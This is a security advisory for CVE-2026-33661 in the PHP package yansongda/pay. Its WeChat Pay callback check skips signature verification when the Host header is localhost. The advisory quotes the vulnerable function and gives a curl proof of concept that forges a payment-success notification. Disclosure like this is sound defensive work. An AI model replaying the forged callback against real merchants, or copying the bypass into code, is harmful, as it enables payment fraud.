# [H] WeChat Pay callback signature verification bypassed when Host header is localhost

## Summary
Severity: High
Advisory: GHSA-q938-ghwv-8gvc
CVE: CVE-2026-33661
CWE: CWE-290
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-q938-ghwv-8gvc
Type: github-advisory

## Affected
- Packagist: `yansongda/pay` — affected >=0 <3.7.20

## Details
## Summary

The `verify_wechat_sign()` function in `src/Functions.php` unconditionally **skips all signature verification** when the PSR-7 request reports `localhost` as the host. An attacker can exploit this by sending a crafted HTTP request to the WeChat Pay callback endpoint with a `Host: localhost` header, bypassing the RSA signature check entirely.

This allows forging fake WeChat Pay payment success notifications, potentially causing applications to mark orders as paid without actual payment.

## Vulnerable Code

**`src/Functions.php` lines 243-246:**
```php
function verify_wechat_sign(ResponseInterface|ServerRequestInterface $message, array $params): void
{
    // BYPASS: Returns without any signature check if Host header is localhost
    if ($message instanceof ServerRequestInterface && 'localhost' === $message->getUri()->getHost()) {
        return;  // No signature verified!
    }

    // ... openssl_verify() only reached when Host != localhost
    $wechatSerial = $message->getHeaderLine('Wechatpay-Serial');
    $sign = $message->getHeaderLine('Wechatpay-Signature');
    $result = 1 === openssl_verify($content, base64_decode($sign), $public, 'sha256WithRSAEncryption');
}
```

In PSR-7 implementations (Nyholm, Guzzle PSR-7, etc.), `$request->getUri()->getHost()` reads the `Host` HTTP header, which is fully attacker-controlled.

## Proof of Concept

```bash
curl -X POST https://merchant.example.com/payment/wechat/callback \
  -H "Host: localhost" \
  -H "Content-Type: application/json" \
  -H "Wechatpay-Serial: any" \
  -H "Wechatpay-Timestamp: 1234567890" \
  -H "Wechatpay-Nonce: abc" \
  -H "Wechatpay-Signature: AAAA" \
  -d '{"id":"fake-order","event_type":"TRANSACTION.SUCCESS"}'
```

`verify_wechat_sign()` returns immediately without verifying the signature. The application marks the order as paid.

## Impact

- **Payment fraud**: Attacker receives goods/services without actual payment by forging WeChat Pay callbacks
- **No authentication required**: Pure network attack, zero privileges needed
- **Wide reach**: Affects any application using `yansongda/pay` for WeChat Pay callback validation. However, in most environments, Nginx/Ingress/Cloudflare/WAF will directly reject the forgery of this request header, so there is no need to worry too much.

## References
- https://github.com/yansongda/pay/security/advisories/GHSA-q938-ghwv-8gvc
- https://nvd.nist.gov/vuln/detail/CVE-2026-33661
- https://github.com/yansongda/pay/commit/26987ebf789f1e7f0a85febb640986ab4289fd7f
- https://github.com/yansongda/pay
- https://github.com/yansongda/pay/releases/tag/v3.7.20
